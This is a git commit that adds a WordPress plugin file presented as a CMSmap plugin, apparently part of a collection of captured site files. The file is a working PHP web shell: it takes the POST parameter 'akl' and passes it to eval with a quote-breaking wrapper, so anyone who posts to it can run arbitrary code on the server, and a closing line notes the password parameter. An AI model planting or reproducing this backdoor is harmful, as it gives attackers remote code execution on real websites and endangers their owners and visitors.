201b25d71c1bf4a58ac8555365fc08a83800fcca
Stefan Pejcic <pejcha1994@gmail.com>
2022-04-29 14:20:30 +0200

    Create index.php

---
+++ 29.04.2022/wp-content/wp-content/plugins/rhvlnrb/index.php
@@ -0,0 +1,28 @@
+<?php
+/**
+ * Plugin Name: CMSmap - WordPress
+ * Plugin URI: https://github.com/m7x/cmsmap/
+ * Description: Simple WordPress - Usage of CMSmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developer assumes no liability and is not responsible for any misuse or damage caused by this program.
+ * Version: 1.0
+ * Author: CMSmap
+ * Author URI: https://github.com/m7x/cmsmap/
+ * License: GPLv2
+ */
+
+function love()
+{
+global $A;
+$A=TT();
+eval("\"$A\"");
+}
+function TT()
+{
+        $a=str_replace('','',$_POST[akl]);
+        
+        return '";'.$a.'//';
+}
+
+love();
+?>
+
+postpass akl
